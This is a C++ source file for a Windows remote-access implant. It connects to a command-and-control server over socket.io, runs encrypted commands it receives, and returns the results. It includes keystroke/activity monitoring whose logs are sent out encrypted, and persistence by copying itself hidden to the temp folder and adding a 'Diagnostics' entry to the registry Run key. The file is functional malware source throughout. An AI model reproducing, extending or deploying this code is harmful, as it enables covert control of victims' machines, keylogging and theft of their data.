#include <sstream>
#include "Implant.h"
#include "Activity.h"
#include "Crypto.h"
#include <iostream>
#include <windows.h>
#include <strsafe.h>

#define BIND_EVENT(IO,EV,FN) \
    IO->on(EV, std::bind(FN, this, std::placeholders::_1));

#define LOG(s) \
    std::cout << "[LOG] " << s << std::endl;

void Implant::run() {

    while (true) {
        switch (config.state) {
        case CONNECTED:
            LOG("Connected.");
            keyExchange();
            config.state = RUNNING;
            break;
        case DISCONNECTED:
            LOG("Disconnected.");
            start();
            break;
        case MONITORING:
            sendLogs();
        case RUNNING:
            LOG("Running.");
            break;
        case STOPPED:
            break;
        }
        Sleep(1000);
    }
}

void Implant::start(){
    std::stringstream ss;
	ss << "http://" << config.ip << ":" << config.port;
    std::string url = ss.str();

    addListeners();

    // io.set_logs_verbose();

    io.connect(url);

    _lock.lock();
    if (config.state != CONNECTED){
        _cond.wait(_lock);
    }
    _lock.unlock();

    enablePersistence();

    run();
}

void Implant::keyExchange() {
    generateKeys();

    io.socket()->emit("key", getPublicKey(), [&](sio::message::list const& msg) {
        std::string stringKey = msg.at(0)->get_string();
        if (verifyServerKey(stringKey)){
            io.socket()->emit("success");
        };
    });
}

void Implant::enablePersistence() {
    TCHAR exePath[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, exePath, MAX_PATH);

    TCHAR tempPath[MAX_PATH] = { 0 };
    GetTempPath(MAX_PATH, tempPath);

    strcat(tempPath, "test.exe");

    if (!CopyFile(exePath, tempPath, FALSE)) {
        LOG("Error copying file.");
    }

    SetFileAttributes(tempPath, GetFileAttributes(tempPath) | FILE_ATTRIBUTE_HIDDEN);

    ::HKEY Handle_Key = 0;

    ::RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_ALL_ACCESS,
        &Handle_Key);

    std::cout << (BYTE*)tempPath << std::endl;

    ::RegSetValueEx(Handle_Key, "Diagnostics", 0, REG_SZ, (BYTE*) tempPath, MAX_PATH);
}

void Implant::onCommand(sio::event& ev){
    try {
        json jCommand = json::parse(decryptMessage(ev.get_message()->get_string()));

        std::string taskID = jCommand["taskID"].get<std::string>();
        int commandID = jCommand["commandID"].get<int>();
        auto& args = jCommand["args"];

        auto callback = [&ev, &jCommand](json response) {
            json j;
            j["taskID"] = jCommand["taskID"];
            j["result"] = response;
            ev.put_ack_message(std::make_shared<std::string>(encryptMessage(j.dump())));
        };

        Command command = { taskID, commandID, args, callback };
        runCommand(std::move(command));
    }
    catch (const std::exception& e) {
        json j;
        j["error"] = e.what();
        ev.put_ack_message(std::make_shared<std::string>(encryptMessage(j.dump())));
    }
}

void Implant::onMonitor(sio::event& ev) {
    static HHOOK keyboardHook;
    bool monitor = ev.get_message()->get_bool();
    std::cout << "MONITOR: " << monitor << std::endl;
    if (monitor) {
        config.state = MONITORING;
        startLogging();
    }
    else {
        config.state = RUNNING;
        stopLogging();
    }
}

void Implant::sendLogs() {
    std::string logs = fetchLogs();
    if (!logs.empty()) {
        std::cout << "LOG: " << logs << std::endl;
        io.socket()->emit("activity", std::make_shared<std::string>(encryptMessage(logs)));
    }
}

void Implant::addListeners() {
    io.set_open_listener(std::bind(&Implant::onConnected, this));
    io.set_close_listener(std::bind(&Implant::onClose, this, std::placeholders::_1));
    io.set_fail_listener(std::bind(&Implant::onFail, this));

    sio::socket::ptr socket = io.socket();

    BIND_EVENT(socket, "command", &Implant::onCommand);
    BIND_EVENT(socket, "monitor", &Implant::onMonitor);
}

void Implant::removeListeners() {
    io.socket()->off_all();
    io.socket()->off_error();
}

void Implant::onConnected()
{
    _lock.lock();
    _cond.notify_all();
    config.state = CONNECTED;
    _lock.unlock();
}

void Implant::onClose(sio::client::close_reason const& reason)
{
    std::cout << "Socket closed." << std::endl;
    config.state = DISCONNECTED;
    removeListeners();
}

void Implant::onFail()
{
    std::cout << "Socket failed." << std::endl;
    config.state = DISCONNECTED;
    removeListeners();
}

Implant::~Implant()
{
    removeListeners();
    io.socket()->close();
}